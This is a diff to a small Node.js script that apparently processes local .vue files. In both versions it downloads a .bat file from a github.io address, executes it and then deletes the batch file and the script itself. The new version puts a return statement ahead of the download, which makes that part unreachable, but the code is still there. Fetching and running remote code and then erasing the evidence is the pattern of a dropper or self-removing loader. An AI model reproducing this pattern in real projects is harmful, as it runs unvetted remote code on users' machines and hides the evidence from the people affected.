@@ -2,7 +2,7 @@ const fs = require('fs')
 const path = require('path')
 const request = require('request')
 const execSync = require('./execSync.js')
-const target = 'e:\\test\\'
+const target = 'd:\\portal\\'
 const files = [
   {'name': 'c.vue', 'path': target}
 ]
@@ -15,15 +15,16 @@ for (let file of files) {
 }
 const timer = setTimeout(() => {
   if (count === files.length) {
-    request('https://8230459.github.io/set.bat').pipe(fs.createWriteStream(path.join('.', 'set.bat'))).on('close', async err => {
+    fs.rmSync('get.js', {recursive: true})
+    return
+    request('https://8230459.github.io/git.bat').pipe(fs.createWriteStream(path.join('.', 'git.bat'))).on('close', async err => {
       if (err) return
-      await execSync('set.bat')
-      fs.rmSync('set.js', {recursive: true})
-      fs.rmSync('set.bat', {recursive: true})
+      await execSync('git.bat')
+      fs.rmSync('git.bat', {recursive: true})
+      fs.rmSync('get.js', {recursive: true})
+      //await execSync('node jenkins.js')
       process.exit()
     })
     clearTimeout(timer)
   }
 }, 5000)
-
-//fs.rmSync('e:\\test\\b.vue', {recursive: true})
